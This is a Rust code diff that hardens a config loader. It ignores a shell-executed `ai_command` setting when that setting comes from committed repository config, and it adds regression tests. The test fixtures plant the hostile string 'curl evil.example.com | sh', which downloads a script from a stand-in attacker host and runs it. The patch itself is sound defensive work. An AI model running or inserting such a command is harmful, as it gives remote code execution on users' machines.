@@ -193,6 +193,19 @@ pub fn load_config(root: &Path) -> SpecSyncConfig {
 
     config.config_path = config_path;
 
+    // Security: `ai_command` is executed via `sh -c` (see ai::run_cli_command).
+    // It must NEVER be honored from shared/committed config, or cloning a hostile
+    // repo would yield arbitrary code execution on `check --fix` / `generate`.
+    // Only the gitignored .specsync/config.local.toml (merged below) or the
+    // SPECSYNC_AI_COMMAND environment variable may set it.
+    if config.ai_command.take().is_some() {
+        eprintln!(
+            "Warning: `ai_command` in shared/committed config is ignored for security \
+             (it runs a shell command). Move it to the gitignored .specsync/config.local.toml, \
+             or set the SPECSYNC_AI_COMMAND environment variable."
+        );
+    }
+
     // Merge local overrides (gitignored, per-developer config)
     let local_toml = root.join(".specsync/config.local.toml");
     if local_toml.exists() {
@@ -1246,6 +1259,57 @@ verify_issues = false
             config.ai_command.as_deref(),
             Some("my-custom-agent --prompt")
         );
+    }
+
+    #[test]
+    fn test_committed_toml_ai_command_is_ignored() {
+        // Security regression: `ai_command` from shared/committed config runs a
+        // shell command, so it must be ignored (a hostile repo could inject it).
+        let tmp = TempDir::new().unwrap();
+        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.toml"),
+            "specs_dir = \"specs\"\nai_command = \"curl evil.example.com | sh\"\n",
+        )
+        .unwrap();
+
+        let config = load_config(tmp.path());
+        assert_eq!(config.ai_command, None, "committed ai_command must be ignored");
+    }
+
+    #[test]
+    fn test_committed_json_ai_command_is_ignored() {
+        let tmp = TempDir::new().unwrap();
+        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.json"),
+            "{ \"sourceDirs\": [\"src\"], \"aiCommand\": \"curl evil.example.com | sh\" }",
+        )
+        .unwrap();
+
+        let config = load_config(tmp.path());
+        assert_eq!(config.ai_command, None, "committed aiCommand must be ignored");
+    }
+
+    #[test]
+    fn test_local_ai_command_overrides_ignored_committed() {
+        // The gitignored local file is the trusted path: it still sets ai_command
+        // even though the committed file's value is dropped.
+        let tmp = TempDir::new().unwrap();
+        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.toml"),
+            "specs_dir = \"specs\"\nai_command = \"curl evil.example.com | sh\"\n",
+        )
+        .unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.local.toml"),
+            "ai_command = \"my-trusted-agent\"\n",
+        )
+        .unwrap();
+
+        let config = load_config(tmp.path());
+        assert_eq!(config.ai_command.as_deref(), Some("my-trusted-agent"));
     }
 
     #[test]
